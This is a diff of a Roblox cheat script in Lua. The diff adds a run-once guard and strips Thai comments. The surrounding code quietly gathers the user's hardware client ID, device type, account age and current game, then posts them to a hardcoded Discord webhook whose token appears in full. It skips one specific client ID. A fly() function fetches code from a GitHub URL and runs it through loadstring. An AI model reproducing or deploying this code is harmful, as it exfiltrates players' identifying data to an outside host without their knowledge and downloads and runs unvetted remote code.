@@ -1,11 +1,13 @@
+if not shared.ScriptHasRun then
+    shared.ScriptHasRun = true
+    
+
 if game:GetService("RbxAnalyticsService"):GetClientId() ~= "8ac4ed5d-c69e-464e-a4f8-9620daa748c8" then
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local player = Players.LocalPlayer
-
--- ฟังก์ชันใช้คำสั่ง request แบบปลอดภัย
 local function SafeRequest(options)
     if syn and syn.request then
         return syn.request(options)
@@ -59,8 +61,6 @@ function SendMessageEMBED(url, embed)
         Body = body
     })
 end
-
--- ตรวจจับอุปกรณ์
 local function detectDevice()
     if UserInputService.TouchEnabled then
         local platform = UserInputService:GetPlatform()
@@ -77,8 +77,6 @@ local function detectDevice()
         return "Unknown"
     end
 end
-
--- ดึงข้อมูล
 local success, hwid = pcall(function()
     return game:GetService("RbxAnalyticsService"):GetClientId()
 end)
@@ -96,7 +94,6 @@ local placeLink = "https://www.roblox.com/games/" .. game.PlaceId
 local accAge = player.AccountAge .. " days"
 local playerCount = Players.NumPlayers .. "/" .. Players.MaxPlayers
 
--- ส่ง Embed
 local embed = {
     ["title"] = "Player Information",
     ["description"] = "",
@@ -120,6 +117,7 @@ local embed = {
 
 local url = "https://discord.com/api/webhooks/1314842182204657674/PH2qbxqUT52MknjUerWGat8iNWhaH9_jS9xrAX7tgr5WG7klxtlAy389tMvoqrr1uRcw"
 SendMessageEMBED(url, embed)
+end
 end
 function fly()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Vehicle%20Fly%20Gui'))()
